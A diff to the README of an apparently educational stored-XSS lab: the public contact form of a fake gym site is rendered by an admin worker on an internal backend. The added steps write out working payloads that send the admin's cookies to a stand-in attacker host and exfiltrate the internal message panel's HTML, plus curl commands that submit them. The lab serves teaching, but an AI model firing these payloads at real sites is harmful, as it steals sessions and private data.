@@ -51,25 +51,34 @@ Trust boundary:
 
 ## Local Domains
 
+Variables used in this guide:
+
+- `container_machine_ip`: IP of the machine that is running the lab containers
+- `attacker_machine_ip`: IP of the attacker machine
+- `docker_host_gateway_ip`: optional host gateway visible from containers when attacker and lab run on the same host
+
 ### Attacker machine
 
 Add only this mapping:
 
 ```text
-192.168.56.10   cross.fit
+container_machine_ip   cross.fit
 ```
 
 Do not add:
 
 ```text
-192.168.56.10   backend.cross.fit
+container_machine_ip   backend.cross.fit
 ```
 
-### Single-host validation note
+Reason:
 
-During the validation performed in this repository, the collector was tested from the Docker network using `172.28.0.1` as the host gateway. That is only a local convenience for same-host testing.
+- the attacker should resolve `cross.fit`
+- the attacker should not resolve `backend.cross.fit` directly
 
-In the intended two-machine lab, replace `ATTACKER_IP` with the real IP of the attacker machine, for example `192.168.56.20`.
+### Same-host note
+
+If you are validating the lab from a single machine instead of two separate machines, some XSS callbacks may need to target the Docker host gateway instead of a second host. In that case, use a value such as `docker_host_gateway_ip` in the payloads.
 
 ## Configuration
 
@@ -129,7 +138,7 @@ Expected: landing page for `CrossFit Atlas`.
 ### Backend isolation
 
 ```bash
-curl -i -H "Host: backend.cross.fit" http://192.168.56.10/
+curl -i -H "Host: backend.cross.fit" http://container_machine_ip/
 ```
 
 Expected: connection closed, empty reply, or a non-success response. The internal backend must not be reachable through the published port.
@@ -173,11 +182,42 @@ It listens on:
 0.0.0.0:9000
 ```
 
-## Short Presentation Flow
+## Step-by-Step Presentation Flow
 
-If you want a quick first demo before showing cookie theft or HTML exfiltration, use a plain Python HTTP server on the attacker machine.
+This section describes the presentation flow in the same order you can use live during the demo.
 
-Start it with:
+### Step 1: show the public application
+
+Open:
+
+```text
+http://cross.fit
+```
+
+Explain that:
+
+- the user-facing entrypoint is the public site
+- the contact form stores the submitted message
+- the page source contains a small operational hint that messages are reviewed from `backend.cross.fit`
+
+### Step 2: confirm backend isolation
+
+From the attacker machine, try:
+
+```bash
+curl -i -H "Host: backend.cross.fit" http://container_machine_ip/
+```
+
+Expected:
+
+- the attacker does not get the internal panel
+- the connection closes or returns a non-success response
+
+This establishes that direct access to `backend.cross.fit` is not available from the attacker side.
+
+### Step 3: start a simple HTTP listener on the attacker side
+
+Run this on the attacker machine:
 
 ```bash
 python3 -m http.server 8000
@@ -188,32 +228,70 @@ Expected:
 - the terminal prints a log line for every HTTP request received
 - no extra code is needed on the attacker side
 
-Suggested opening narrative:
+### Step 4: submit a probe payload through the public form
 
-1. Show that the public landing includes a hint that messages are reviewed in `backend.cross.fit`.
-2. Start `python3 -m http.server 8000` on the attacker machine.
-3. Submit a contact message with a minimal XSS payload that makes a request to that HTTP server.
-4. Wait for the worker to process the message.
-5. Show the request appearing in the Python server log.
+Use a payload that only makes a request to the attacker-controlled HTTP server:
 
-This confirms that the JavaScript executed in the privileged browser session tied to `backend.cross.fit`.
+```html
+<img src=x onerror="new Image().src='http://attacker_machine_ip:8000/ping'">
+```
+
+If attacker and lab are on the same host, use:
+
+```html
+<img src=x onerror="new Image().src='http://docker_host_gateway_ip:8000/ping'">
+```
+
+Submit it through the public form on `cross.fit`, or with `curl`.
+
+### Step 5: wait for the worker
+
+The worker logs in as admin to `backend.cross.fit`, opens the next message, renders it, and marks it as processed.
+
+You can watch it with:
+
+```bash
+docker compose logs -f worker
+```
+
+### Step 6: show the incoming request on the attacker server
+
+Expected on the attacker machine:
+
+```text
+"GET /ping HTTP/1.1" 404 -
+```
+
+The `404` is acceptable. The relevant fact is that the request reached the attacker-controlled server.
+
+### Step 7: explain the conclusion
+
+At this point you can state:
+
+- the attacker never browsed `backend.cross.fit` directly
+- the public form stored attacker-controlled input
+- the privileged browser session attached to `backend.cross.fit` executed the payload
+- this is enough to confirm that the internal panel is vulnerable to stored XSS
 
 ## Payloads
 
-Replace `ATTACKER_IP` with the attacker machine IP.
+Replace:
+
+- `attacker_machine_ip` with the IP of the attacker machine
+- `docker_host_gateway_ip` only when doing same-host validation
 
 ### Probe request to a manual Python HTTP server
 
 Use this first if you only want to prove code execution against the internal backend:
 
 ```html
-<img src=x onerror="new Image().src='http://ATTACKER_IP:8000/ping'">
+<img src=x onerror="new Image().src='http://attacker_machine_ip:8000/ping'">
 ```
 
 Same-host validation shortcut:
 
 ```html
-<img src=x onerror="new Image().src='http://172.28.0.1:8000/ping'">
+<img src=x onerror="new Image().src='http://docker_host_gateway_ip:8000/ping'">
 ```
 
 Expected on the attacker machine with `python3 -m http.server 8000`:
@@ -238,7 +316,7 @@ Expected:
 ### Cookie theft
 
 ```html
-<img src=x onerror="new Image().src='http://ATTACKER_IP:9000/collect?c='+encodeURIComponent(document.cookie)">
+<img src=x onerror="new Image().src='http://attacker_machine_ip:9000/collect?c='+encodeURIComponent(document.cookie)">
 ```
 
 Expected in vulnerable mode:
@@ -254,7 +332,7 @@ fetch('/admin/messages', { credentials: 'include' })
   .then(r => r.text())
   .then(html => {
     const b64 = btoa(unescape(encodeURIComponent(html)));
-    fetch('http://ATTACKER_IP:9000/internal-html', {
+    fetch('http://attacker_machine_ip:9000/internal-html', {
       method: 'POST',
       mode: 'no-cors',
       headers: { 'Content-Type': 'text/plain' },
@@ -288,7 +366,7 @@ curl -i -X POST http://cross.fit/contact \
   -d "full_name=Alumno XSS" \
   -d "email=xss@example.com" \
   -d "phone=099000000" \
-  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://ATTACKER_IP:9000/collect?c='+encodeURIComponent(document.cookie)\">"
+  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://attacker_machine_ip:9000/collect?c='+encodeURIComponent(document.cookie)\">"
 ```
 
 ### Probe request to Python HTTP server
@@ -298,7 +376,7 @@ curl -i -X POST http://cross.fit/contact \
   -d "full_name=Alumno XSS Probe" \
   -d "email=xss-probe@example.com" \
   -d "phone=099000009" \
-  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://ATTACKER_IP:8000/ping'\">"
+  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://attacker_machine_ip:8000/ping'\">"
 ```
 
 ### HTML exfiltration payload
@@ -308,7 +386,7 @@ curl -i -X POST http://cross.fit/contact \
   -d "full_name=Alumno XSS 2" \
   -d "email=xss2@example.com" \
   -d "phone=099000001" \
-  --data-urlencode "message=<script>fetch('/admin/messages', { credentials: 'include' }).then(r => r.text()).then(html => { const b64 = btoa(unescape(encodeURIComponent(html))); fetch('http://ATTACKER_IP:9000/internal-html', { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: b64 }); });</script>"
+  --data-urlencode "message=<script>fetch('/admin/messages', { credentials: 'include' }).then(r => r.text()).then(html => { const b64 = btoa(unescape(encodeURIComponent(html))); fetch('http://attacker_machine_ip:9000/internal-html', { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: b64 }); });</script>"
 ```
 
 ## Worker Behavior
